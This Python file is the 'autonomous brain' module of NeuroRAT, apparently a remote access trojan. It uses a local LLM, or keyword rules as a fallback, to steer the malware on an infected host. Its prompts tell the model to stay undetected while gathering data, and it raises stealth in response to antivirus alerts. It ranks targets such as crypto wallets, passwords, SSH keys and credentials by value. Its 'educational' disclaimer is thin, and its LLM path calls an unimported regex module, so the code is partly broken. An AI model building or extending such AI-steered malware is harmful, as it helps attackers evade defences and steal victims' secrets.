#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NeuroRAT Autonomous Brain Module
--------------------------------
Provides local AI decision-making capabilities without requiring external API access.
Uses a small-footprint LLM model for on-device intelligence.

Author: Mr. Thomas Anderson (iamtomasanderson@gmail.com)
License: MIT

WARNING: This module is part of an educational project. Use only on systems you own or have permission to test.
"""

import os
import sys
import time
import json
import logging
import threading
import tempfile
import platform
import numpy as np
from typing import Dict, List, Any, Optional, Union, Tuple
from pathlib import Path

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("NeuroRAT-Brain")

# Try to import optional dependencies
try:
    import torch
    from transformers import AutoModelForCausalLM, AutoTokenizer
    HAS_TRANSFORMERS = True
    logger.info("Transformers library available - full autonomous capabilities enabled")
except ImportError:
    HAS_TRANSFORMERS = False
    logger.warning("Transformers library not available - falling back to rule-based decisions")

# Try to import sentence transformers for embeddings
try:
    from sentence_transformers import SentenceTransformer
    HAS_SENTENCE_TRANSFORMERS = True
except ImportError:
    HAS_SENTENCE_TRANSFORMERS = False

class AutonomousBrain:
    """
    Autonomous decision-making engine for NeuroRAT.
    Uses a local LLM to make decisions without external API dependencies.
    Falls back to rule-based decision making if ML libraries aren't available.
    """
    
    def __init__(
        self,
        model_path: Optional[str] = None,
        embedding_model_path: Optional[str] = None,
        cache_dir: Optional[str] = None,
        system_profile: Optional[str] = None,
        max_memory_mb: int = 512,
        verbose: bool = False
    ):
        """
        Initialize the autonomous brain.
        
        Args:
            model_path: Path to local LLM model or model name from HuggingFace
            embedding_model_path: Path to sentence embedding model
            cache_dir: Directory to cache downloaded models
            system_profile: Type of system to optimize for ('stealth', 'aggressive', 'balanced')
            max_memory_mb: Maximum memory usage in MB
            verbose: Enable verbose logging
        """
        self.model_path = model_path or "TinyLlama/TinyLlama-1.1B-Chat-v1.0"  # Sensible default, small enough for edge devices
        self.embedding_model_path = embedding_model_path or "all-MiniLM-L6-v2"
        self.cache_dir = cache_dir or os.path.join(tempfile.gettempdir(), "neurorat_models")
        self.system_profile = system_profile or "balanced"
        self.max_memory_mb = max_memory_mb
        self.verbose = verbose
        
        # Create cache dir if it doesn't exist
        os.makedirs(self.cache_dir, exist_ok=True)
        
        # Internal state
        self.llm_model = None
        self.llm_tokenizer = None
        self.embedding_model = None
        self.context_window = []
        self.last_decision_time = 0
        self.current_state = {
            "stealth_level": self._get_initial_stealth_level(),
            "aggression_level": self._get_initial_aggression_level(),
            "system_knowledge": {},
            "action_history": [],
            "detected_threats": [],
            "mission_objectives": []
        }
        
        # System templates for prompts
        self.system_templates = {
            "stealth": "You are an autonomous security agent operating in stealth mode. Your primary objective is to remain undetected while collecting information. Avoid risky actions that could trigger security systems.",
            "balanced": "You are an autonomous security agent with balanced priorities. Collect valuable information while maintaining a reasonable level of stealth. Take calculated risks when the reward justifies it.",
            "aggressive": "You are an autonomous security agent focused on rapid information gathering. Prioritize obtaining high-value data quickly, even if it increases the risk of detection."
        }
        
        # Initialize models if dependencies are available
        self._initialize_models()
    
    def _initialize_models(self) -> None:
        """Initialize LLM and embedding models if dependencies are available."""
        if not HAS_TRANSFORMERS:
            logger.warning("Cannot initialize LLM models - missing dependencies")
            return
        
        try:
            logger.info(f"Initializing LLM model from {self.model_path}")
            
            # Use lower precision to reduce memory usage
            self.llm_tokenizer = AutoTokenizer.from_pretrained(
                self.model_path,
                cache_dir=self.cache_dir
            )
            
            # Load model with reduced precision for memory efficiency
            self.llm_model = AutoModelForCausalLM.from_pretrained(
                self.model_path,
                torch_dtype=torch.float16,  # Use fp16 instead of fp32
                low_cpu_mem_usage=True,
                cache_dir=self.cache_dir
            )
            
            # Load embedding model if available
            if HAS_SENTENCE_TRANSFORMERS:
                logger.info(f"Initializing embedding model from {self.embedding_model_path}")
                self.embedding_model = SentenceTransformer(
                    self.embedding_model_path,
                    cache_folder=self.cache_dir
                )
        
        except Exception as e:
            logger.error(f"Error initializing LLM models: {str(e)}")
            self.llm_model = None
            self.llm_tokenizer = None
    
    def _get_initial_stealth_level(self) -> float:
        """Determine initial stealth level based on system profile."""
        profiles = {
            "stealth": 0.9,
            "balanced": 0.6,
            "aggressive": 0.3
        }
        return profiles.get(self.system_profile, 0.6)
    
    def _get_initial_aggression_level(self) -> float:
        """Determine initial aggression level based on system profile."""
        profiles = {
            "stealth": 0.2,
            "balanced": 0.5,
            "aggressive": 0.8
        }
        return profiles.get(self.system_profile, 0.5)
    
    def _get_system_prompt(self) -> str:
        """Get the appropriate system prompt based on current profile."""
        return self.system_templates.get(self.system_profile, self.system_templates["balanced"])
    
    def _format_context(self, system_info: Dict[str, Any]) -> str:
        """Format context information for the LLM."""
        context = f"""
System Information:
OS: {system_info.get('os', 'Unknown')}
Hostname: {system_info.get('hostname', 'Unknown')}
Username: {system_info.get('username', 'Unknown')}
Current Time: {time.strftime('%Y-%m-%d %H:%M:%S')}

Stealth Level: {self.current_state['stealth_level']:.2f}
Aggression Level: {self.current_state['aggression_level']:.2f}

Recent Actions:
"""
        
        # Add recent actions
        for action in self.current_state['action_history'][-5:]:
            context += f"- {action.get('action', 'Unknown')}: {action.get('result', 'Unknown')}\n"
        
        # Add detected threats
        if self.current_state['detected_threats']:
            context += "\nDetected Threats:\n"
            for threat in self.current_state['detected_threats']:
                context += f"- {threat}\n"
        
        return context
    
    def decide_action(
        self,
        situation: str,
        options: List[str],
        system_info: Dict[str, Any],
        urgency: float = 0.5
    ) -> Dict[str, Any]:
        """
        Decide on the best action to take given the current situation.
        
        Args:
            situation: Description of the current situation
            options: List of possible actions to take
            system_info: Information about the target system
            urgency: How urgent the decision is (0.0 to 1.0)
            
        Returns:
            Dictionary with the chosen action and reasoning
        """
        # Update state with system info
        self.current_state["system_knowledge"].update(system_info)
        
        # Record decision time
        self.last_decision_time = time.time()
        
        # If LLM is available, use it for decision making
        if self.llm_model and self.llm_tokenizer:
            return self._decide_with_llm(situation, options, system_info, urgency)
        else:
            # Fall back to rule-based decision making
            return self._decide_with_rules(situation, options, system_info, urgency)
    
    def _decide_with_llm(
        self,
        situation: str,
        options: List[str],
        system_info: Dict[str, Any],
        urgency: float
    ) -> Dict[str, Any]:
        """Use LLM to make a decision."""
        try:
            # Format the prompt
            system_prompt = self._get_system_prompt()
            context = self._format_context(system_info)
            
            options_text = "\n".join([f"{i+1}. {option}" for i, option in enumerate(options)])
            
            full_prompt = f"""{system_prompt}

{context}

Current Situation:
{situation}

Available Actions:
{options_text}

Based on the current situation and system state, determine the best action to take.
Consider the stealth level ({self.current_state['stealth_level']:.2f}) and aggression level ({self.current_state['aggression_level']:.2f}).
The urgency level is {urgency:.2f} (0.0-1.0).

Your response format should be:
ACTION: [number of chosen action]
REASONING: [explanation for your choice]
NEXT STEPS: [what should happen after this action]
"""

            # Process with LLM
            inputs = self.llm_tokenizer(full_prompt, return_tensors="pt")
            
            with torch.no_grad():
                outputs = self.llm_model.generate(
                    inputs["input_ids"],
                    max_length=512,
                    temperature=0.7,
                    top_p=0.9,
                    do_sample=True
                )
            
            response = self.llm_tokenizer.decode(outputs[0], skip_special_tokens=True)
            
            # Parse response
            action_match = re.search(r'ACTION:\s*(\d+)', response)
            reasoning_match = re.search(r'REASONING:\s*(.*?)(?:NEXT STEPS:|$)', response, re.DOTALL)
            next_steps_match = re.search(r'NEXT STEPS:\s*(.*?)$', response, re.DOTALL)
            
            action_idx = int(action_match.group(1)) - 1 if action_match else 0
            action_idx = max(0, min(action_idx, len(options) - 1))  # Ensure within bounds
            
            chosen_action = options[action_idx]
            reasoning = reasoning_match.group(1).strip() if reasoning_match else "No explicit reasoning provided."
            next_steps = next_steps_match.group(1).strip() if next_steps_match else "No next steps provided."
            
            # Record the action
            self.current_state["action_history"].append({
                "time": time.time(),
                "action": chosen_action,
                "reasoning": reasoning,
                "situation": situation
            })
            
            return {
                "action": chosen_action,
                "reasoning": reasoning,
                "next_steps": next_steps,
                "method": "llm",
                "confidence": 0.85
            }
            
        except Exception as e:
            logger.error(f"Error in LLM decision making: {str(e)}")
            # Fall back to rule-based if LLM fails
            return self._decide_with_rules(situation, options, system_info, urgency)
    
    def _decide_with_rules(
        self,
        situation: str,
        options: List[str],
        system_info: Dict[str, Any],
        urgency: float
    ) -> Dict[str, Any]:
        """Use rule-based logic to make a decision when LLM is not available."""
        # Define keywords that influence decisions
        stealth_keywords = ["detection", "monitor", "alert", "antivirus", "firewall", "log", "security"]
        aggressive_keywords = ["password", "credential", "admin", "root", "sensitive", "wallet", "bitcoin", "ethereum"]
        
        # Initialize scores for each option
        scores = [0.5] * len(options)
        
        # Score based on stealth keywords (higher score = less stealthy)
        for i, option in enumerate(options):
            # Check for stealth concerns
            stealth_score = sum(2 if kw in option.lower() else 0 for kw in stealth_keywords) / len(stealth_keywords)
            # Check for high-value targets
            value_score = sum(2 if kw in option.lower() else 0 for kw in aggressive_keywords) / len(aggressive_keywords)
            
            # Adjust based on system profile
            stealth_factor = 1.0 - self.current_state["stealth_level"]
            aggression_factor = self.current_state["aggression_level"]
            urgency_factor = urgency
            
            # Calculate final score
            final_score = (
                stealth_score * stealth_factor * 0.4 +
                value_score * aggression_factor * 0.4 +
                urgency_factor * 0.2
            )
            
            scores[i] = final_score
        
        # Pick the option with the highest score
        best_option_idx = scores.index(max(scores))
        chosen_action = options[best_option_idx]
        
        # Generate reasoning
        if self.current_state["stealth_level"] > 0.7:
            reasoning = "Chose the most stealthy option to avoid detection."
        elif self.current_state["aggression_level"] > 0.7:
            reasoning = "Chose the option with highest potential value, despite increased detection risk."
        else:
            reasoning = "Chose a balanced option considering both stealth and information value."
        
        # Record the action
        self.current_state["action_history"].append({
            "time": time.time(),
            "action": chosen_action,
            "reasoning": reasoning,
            "situation": situation
        })
        
        return {
            "action": chosen_action,
            "reasoning": reasoning,
            "next_steps": "Continue monitoring system behavior and adjust stealth level as needed.",
            "method": "rule-based",
            "confidence": 0.6
        }
    
    def adjust_stealth_level(self, detection_indicators: List[str]) -> float:
        """
        Adjust stealth level based on detection indicators.
        
        Args:
            detection_indicators: List of indicators suggesting potential detection
            
        Returns:
            New stealth level
        """
        if not detection_indicators:
            # Gradually decrease stealth if no threats detected
            self.current_state["stealth_level"] = max(
                self._get_initial_stealth_level() * 0.8,  # Don't go below 80% of initial
                self.current_state["stealth_level"] * 0.95  # Gradually decrease by 5%
            )
            return self.current_state["stealth_level"]
        
        # Add new threats to our tracking
        for indicator in detection_indicators:
            if indicator not in self.current_state["detected_threats"]:
                self.current_state["detected_threats"].append(indicator)
        
        # Increase stealth based on number and severity of indicators
        increase_factor = 0.1 * len(detection_indicators)
        
        # Check for severe indicators
        severe_keywords = ["blocked", "detected", "quarantined", "alert", "warning"]
        severity_bonus = sum(0.2 if any(kw in ind.lower() for kw in severe_keywords) else 0 
                           for ind in detection_indicators)
        
        # Calculate new stealth level
        new_level = min(0.95, self.current_state["stealth_level"] + increase_factor + severity_bonus)
        self.current_state["stealth_level"] = new_level
        
        # When stealth increases, aggression should decrease
        self.current_state["aggression_level"] = max(
            0.1,  # Minimum aggression
            self.current_state["aggression_level"] * 0.8  # Significantly decrease
        )
        
        return new_level
    
    def evaluate_target_value(self, target_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Evaluate the potential value of a target or piece of data.
        
        Args:
            target_data: Information about the target to evaluate
            
        Returns:
            Dictionary with value score and reasoning
        """
        # Define value indicators
        high_value_indicators = {
            "files": ["wallet", "password", "backup", "key", "secret", "config", "ssh", "credential"],
            "processes": ["bank", "wallet", "password", "keychain", "vault", "vpn", "crypto"],
            "services": ["database", "finance", "banking", "admin", "management", "repository"],
            "users": ["admin", "root", "administrator", "system", "superuser"]
        }
        
        category = target_data.get("category", "unknown")
        name = target_data.get("name", "").lower()
        description = target_data.get("description", "").lower()
        
        # Calculate base value score
        base_score = 0.3  # Default value
        
        # Check against indicators for the specific category
        if category in high_value_indicators:
            indicators = high_value_indicators[category]
            matches = sum(1 for ind in indicators if ind in name or ind in description)
            indicator_score = min(0.7, matches * 0.1)
            base_score += indicator_score
        
        # Adjust based on current aggression level
        final_score = base_score * (0.5 + self.current_state["aggression_level"] * 0.5)
        
        # Generate reasoning
        if final_score > 0.7:
            reasoning = f"High-value target detected: {name}. Contains multiple indicators of valuable data."
        elif final_score > 0.4:
            reasoning = f"Moderate-value target: {name}. May contain useful information."
        else:
            reasoning = f"Low-value target: {name}. Unlikely to contain valuable information."
        
        return {
            "value_score": final_score,
            "reasoning": reasoning,
            "priority": "high" if final_score > 0.7 else "medium" if final_score > 0.4 else "low"
        }
    
    def get_status(self) -> Dict[str, Any]:
        """Get the current status of the autonomous brain."""
        return {
            "llm_available": self.llm_model is not None,
            "embedding_available": self.embedding_model is not None,
            "system_profile": self.system_profile,
            "stealth_level": self.current_state["stealth_level"],
            "aggression_level": self.current_state["aggression_level"],
            "action_count": len(self.current_state["action_history"]),
            "threat_count": len(self.current_state["detected_threats"]),
            "last_decision_time": self.last_decision_time
        }
    
    def save_state(self, file_path: Optional[str] = None) -> str:
        """
        Save the current brain state to a file.
        
        Args:
            file_path: Path to save the state. If None, a default path is used.
            
        Returns:
            Path to the saved state file
        """
        if file_path is None:
            file_path = os.path.join(self.cache_dir, f"brain_state_{int(time.time())}.json")
        
        # Don't save the actual models, just the state
        state_to_save = {
            "system_profile": self.system_profile,
            "current_state": self.current_state,
            "context_window": self.context_window,
            "last_decision_time": self.last_decision_time,
            "model_path": self.model_path,
            "embedding_model_path": self.embedding_model_path
        }
        
        with open(file_path, 'w') as f:
            json.dump(state_to_save, f, indent=2)
        
        return file_path
    
    def load_state(self, file_path: str) -> bool:
        """
        Load brain state from a file.
        
        Args:
            file_path: Path to the state file
            
        Returns:
            True if loaded successfully, False otherwise
        """
        try:
            with open(file_path, 'r') as f:
                state = json.load(f)
            
            self.system_profile = state.get("system_profile", self.system_profile)
            self.current_state = state.get("current_state", self.current_state)
            self.context_window = state.get("context_window", self.context_window)
            self.last_decision_time = state.get("last_decision_time", self.last_decision_time)
            
            return True
        except Exception as e:
            logger.error(f"Error loading brain state: {str(e)}")
            return False

# For direct testing
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Test the NeuroRAT Autonomous Brain")
    parser.add_argument("--model", type=str, default=None, help="Path to LLM model")
    parser.add_argument("--profile", type=str, choices=["stealth", "balanced", "aggressive"], 
                        default="balanced", help="System profile")
    parser.add_argument("--memory", type=int, default=512, help="Max memory usage in MB")
    args = parser.parse_args()
    
    print("Initializing NeuroRAT Autonomous Brain...")
    brain = AutonomousBrain(
        model_path=args.model,
        system_profile=args.profile,
        max_memory_mb=args.memory,
        verbose=True
    )
    
    print("\nTesting decision making...")
    situation = "Found a file named 'passwords.txt' in the user's home directory"
    options = [
        "Open and read the file immediately",
        "Copy the file to a secure location for later analysis",
        "Check if the file is being monitored before accessing",
        "Ignore the file as it might be a honeypot"
    ]
    system_info = {
        "os": platform.system(),
        "hostname": platform.node(),
        "username": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER') or os.getenv('USERNAME')
    }
    
    decision = brain.decide_action(situation, options, system_info, urgency=0.5)
    
    print(f"\nDecision: {decision['action']}")
    print(f"Reasoning: {decision['reasoning']}")
    print(f"Next steps: {decision['next_steps']}")
    print(f"Method: {decision['method']}")
    print(f"Confidence: {decision['confidence']:.2f}")
    
    print("\nCurrent brain status:")
    status = brain.get_status()
    for key, value in status.items():
        print(f"  {key}: {value}") 